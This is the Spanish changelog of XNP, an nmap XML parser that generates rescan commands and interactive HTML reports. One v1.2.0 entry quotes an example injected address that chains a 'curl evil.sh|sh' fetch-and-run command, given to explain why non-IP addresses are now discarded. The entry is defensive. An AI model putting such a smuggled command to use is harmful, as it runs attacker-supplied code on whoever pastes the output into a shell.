# Registro de cambios

Versiones publicadas de [XNP](https://github.com/xtormin/XtremeNmapParser).

[← Volver al README](README.es.md) · [English](CHANGELOG.md)

## XNP v1.2.0 — el informe HTML

- **Nuevo `--rescan`: el comando de nmap para la siguiente pasada, construido a
  partir de lo que encontró esta.** Un escaneo terminado ya sabe qué hosts están
  vivos y qué puertos tienen abiertos, así que `xnp -d nmap/ --rescan` imprime
  los comandos que apuntan exactamente a eso en vez de volver a barrer hosts
  enteros. Como nmap aplica una única lista de puertos a todos los objetivos de
  la invocación, los hosts se agrupan **por firma de puertos**: los que tienen
  el mismo conjunto de puertos abiertos comparten comando, y a ninguno se le
  manda un puerto que no tiene. La lista de puertos, los tipos de escaneo y `-6`
  se deciden por grupo, así que un grupo UDP lleva `-sU` y prefijos `U:`, uno
  mixto lleva además un tipo TCP explícito (sin él, nmap ignora la mitad `T:`) y
  a uno solo TCP se le deja el comportamiento por defecto de nmap salvo que el
  perfil pidiera otro. `--rescan-args="…"` sustituye los argumentos por
  completo. Los comandos van a stderr, así que stdout sigue siendo la lista
  limpia de rutas generadas.
- **Los argumentos del reescaneo admiten variables `$[...]`**, así que un perfil
  puede nombrar su propio fichero de salida en vez de que todos los comandos
  sobrescriban el mismo: `--rescan-args='-sV -oA scans/$[HOSTNAME] -Pn'` (con
  comillas simples: `$[...]` es la expansión aritmética heredada de bash).
  `$[IP]`, `$[HOSTNAME]` (el nombre resuelto, o la dirección si el escaneo no
  resolvió ninguno), `$[PORTS]`, `$[TCP_PORTS]` y `$[UDP_PORTS]` se sustituyen
  en cada comando. `$[IP]` y `$[HOSTNAME]` nombran a un host concreto, así que
  usar uno divide su grupo en un comando por host: un valor que cambia con el
  host no se puede escribir una sola vez en un comando compartido. Los
  corchetes distinguen una variable de XNP de una de entorno, un nombre que no
  sea de esos se queda en el comando en lugar de vaciarse, y un hostname se
  sanea como una dirección: lo que un shell leería se descarta, no se escapa.
  La caja `personalizado` del informe acepta las mismas variables, y nombra
  debajo las que hayas escrito mal.
- **Las comillas que escribas en los argumentos del reescaneo se respetan.**
  `-oA "nmap/$[IP] deep"` sale entrecomillado tal y como entró, porque puede que
  las comillas hagan falta y solo quien las escribió sabe si la ruta lleva un
  espacio. Un token escrito sin ellas se sigue entrecomillando solo cuando lo
  necesita, y unas comillas sin cerrar llegan al comando tal cual en vez de
  tumbar la ejecución.
- Los perfiles viven en `config.yaml`, en un bloque `rescan:` nuevo: `service`,
  `vuln`, `recheck` y `full` vienen de serie, y uno añadido en
  `config/config.yaml` se suma a ellos en lugar de reemplazar el bloque.
  `states` decide a qué estados de puerto merece la pena apuntar; incluye
  `open|filtered` por defecto, que es el estado normal de un puerto UDP y justo
  lo que resuelve una segunda pasada corta.
- **El botón `nmap` del informe ya genera comandos que funcionan.** Antes emitía
  una única línea cartesiana —todos los puertos del grupo contra todos sus
  hosts—, que sondeaba puertos que la mayoría de esos hosts no tenía, e ignoraba
  el protocolo por completo, así que un grupo UDP salía sin `-sU` y con sus
  puertos etiquetados como TCP. Ahora usa el mismo generador que `--rescan`.
- **Un control de reescaneo en la barra de herramientas de las pestañas
  Servicios y Datos**, junto al botón de entrega que cada una ya tenía, con un
  selector de perfil que se llena desde tu `config.yaml` y una caja de texto
  para escribir los argumentos a mano. Copia los comandos de la selección
  actual —todo, o lo que haya dejado el filtro— y el número de la etiqueta
  sigue al filtro en vivo, así que ves cómo `service:ssh` convierte siete
  comandos en uno antes de pulsar.
- **La ayuda del lenguaje de consulta está detrás de un botón de información**
  junto a *Limpiar*, en vez de ocupar un párrafo bajo el buscador en todas las
  pestañas para siempre. La elección se recuerda.
- El pie enlaza al proyecto en GitHub.
- Las direcciones se validan antes de llegar a una línea de comandos. `addr` es
  CDATA en `nmap.dtd`, así que un informe que declare
  `addr="10.0.0.1; curl evil.sh|sh"` es válido — y estos comandos están hechos
  para pegarse en una shell. Lo que no sea una dirección IP se descarta en vez
  de escaparse, tanto en Python como en JavaScript.

- **Una carpeta se fusiona y se recorre entera por defecto.** `xnp -d nmap/` es
  el comando completo: `-M` y `-R` ya no hacen falta (se siguen aceptando, así
  que los scripts de siempre funcionan igual) y los nuevos `--no-merger` /
  `--no-recursive` desactivan cada mitad.
- Nuevo `--show`: abre el informe HTML generado en el navegador al terminar, que
  es justo lo que quieres ahora que el nombre lleva fecha y hora. Una máquina
  sin navegador recibe un aviso, no un run fallido.
- **El informe fusionado se nombra con la carpeta y se escribe dentro de ella**,
  con la fecha y la hora: `xnp -d nmap/` genera
  `nmap/nmap_20260910-134500.html` en lugar de `merged_nmap_scan_data.html` en
  el directorio desde el que lanzaras el comando. Todos los formatos de una
  misma pasada comparten la marca de tiempo, y una segunda pasada añade un
  informe en vez de pisar el entregable de ayer. `-oN` sigue mandando sobre
  todo esto y se respeta tal cual.
- Nuevo formato de salida `html`: un informe interactivo autocontenido en temas
  claro y oscuro, dentro del conjunto por defecto de `-oF`. Tres pestañas:
  cifras de cabecera y gráficas, puertos abiertos agrupados por servicio con
  listas de objetivos copiables, y la tabla completa con filtros de columna
  estilo Excel, un lenguaje de consulta y un panel lateral de detalle por fila.
  Cada cifra, barra y sector filtra la tabla al pulsarlo y se escribe solo en la
  barra de consulta.
- Los puertos llevan un nivel de *interés* y un conjunto de etiquetas
  (`database`, `no-auth`, `cleartext-creds`, …) en lugar de una puntuación de
  "riesgo": la etiqueta dice qué merece un vistazo y no afirma nada sobre
  vulnerabilidad.
- El informe HTML llega a datos que los otros formatos nunca vieron. Los
  escritores solo recibían las once columnas planas, así que la línea de comando
  de nmap, la detección de SO, los CPE, los motivos del estado de cada puerto y
  la salida NSE estructurada se parseaban y se tiraban; ahora
  `NmapParser.parse_all` / `merge_all` entregan los informes parseados al
  escritor junto al DataFrame.
- Las opciones de `-oF` se derivan del registro de escritores, así que el CLI ya
  no puede quedarse atrás cuando se añade un formato.
- Chart.js 4.5.1 (MIT) va incluido; el informe no hace peticiones de red.
- La paleta del informe la audita la suite de tests contra el AA de WCAG, y el
  color de acento de interacción ya no comparte tono con los colores de nivel.
- Parsear un directorio ya no se detiene en el primer fichero que falla la
  validación: se avisa del fichero, se salta y se sigue, y al final se nombran
  todos los que se saltaron. Un fichero nombrado con `-f` sigue terminando la
  ejecución.
- Nuevo directorio `examples/` con escaneos de muestra, y
  `scripts/generate_examples.py` para regenerarlos.
- IBM Plex Sans/Mono (SIL OFL) van incluidas e incrustadas, así que el informe se
  ve con su tipografía en una máquina que no la ha visto nunca.
- El informe es bilingüe (español/inglés), conmutable junto al selector de tema.
  Los motivos que hay detrás de cada etiqueta se traducen en el origen y no en la
  página.

## XNP v1.1.0 — paquete instalable y validación de entrada

- XNP es ya un paquete instalable (`pip install .`) con un comando `xnp`, y
  funciona desde cualquier directorio. Antes la configuración se leía de una ruta
  relativa, así que solo funcionaba desde la raíz del repositorio.
- Validación de entrada en tres capas: parser XML endurecido, comprobación de la
  raíz `<nmaprun>` y validación DTD con `--no-validate` como escape para salida
  compatible con nmap de otros escáneres. Una entrada inválida ahora sale limpia
  en vez de lanzar un `AttributeError`.
- La autoactualización del arranque ya no ejecuta `git pull` por su cuenta.
  Avisa de que existe una versión nueva; `xnp --update` es quien actualiza.
- Correcciones: los hosts IPv6 se quedaban sin dirección; la columna `Scripts`
  contenía reprs de objetos de Python; se ignoraba `-oN` junto con `-f`; los
  nombres de salida se truncaban cuando la ruta contenía `.xml`; una escritura
  fallida seguía reportando éxito; fusionar solo escaneos vacíos petaba.
- Nuevo flag `--include-hostless`: emite una fila para los hosts sin puertos, que
  antes se descartaban en silencio.
- Suite de tests y CI en Python 3.9 – 3.13.

## v1.0.x — versiones anteriores

- **24/06/2023 — v1.0.5** — `-C` acepta ya `default` y `all`; las columnas de
  cada caso se definen en `config.yaml`.
- **24/06/2023 — v1.0.4** — Refactor de los argumentos `outputformat` y
  `outputname`.
- **24/06/2023 — v1.0.3** — Comprobación de versión al arrancar y
  autoactualización.
- **13/06/2023 — v1.0.2** — Cabeceras personalizadas, columna opcional
  `Scripts`, exportar solo puertos abiertos.
- **07/06/2023 — v1.0.1** — Código refactorizado, clase `NmapXMLReport.py` para
  parsear el XML, opción recursiva.
- **05/06/2023 — v1.0.0** — Publicación oficial.
